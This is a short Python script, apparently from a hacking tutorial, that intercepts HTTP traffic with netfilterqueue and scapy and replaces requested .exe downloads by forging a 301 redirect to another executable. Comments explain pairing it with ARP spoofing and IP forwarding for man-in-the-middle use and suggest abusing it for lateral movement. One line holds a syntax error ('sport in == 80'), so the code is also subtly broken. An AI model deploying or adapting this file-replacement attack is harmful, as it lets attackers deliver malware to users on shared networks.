#MM - Last updated on 08.05.2019
#MM - No dependencies

import netfilterqueue
import scapy.all as scapy


ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    #Removes the len and checksums from the packet to allow scapy to auto-recalculate them.
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("HTTP Request")
            #Expand on this .exe to include pdf, doc, and more extensions. This is all up to developers.
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+]---Executable Reference---")
                #Append the ack to the ack_list to be used for a TCP handshake reference.
                ack_list.append(scapy_packet[scapy.TCP].ack)
                #Don't really need to print this but left it for reference.
                print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport in == 80:
            print("HTTP Response")
            #Reference the sequence to see if it is within the ack_list for a TCP handshake.
            if scapy_packet[scapy.TCP].seq in ack_list:
                #Removes the value from the variable once it is referenced successfully.
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+]---Replacing File---")
                #Don't really need to print this but left it for reference.
                print(scapy_packet.show())
                #File to be redirected to. Added \n\n to the end to enforce it to browse to the location without any additional data being appended from the load.
                #Below it shows how to link to a .exe file hosted online. This can be abused to allow for lateral movement by referencing an internal web server/IP via MITM and ARP spoofing.
                #If you attempt MITM variabtion, don't forget to enable IP forwarding otherwise packets won't flow properly!
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://notepad-plus-plus.org/repository/7.x/7.7.1/npp.7.7.1.Installer.exe\n\n")

                packet.set_payload(str(modified_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
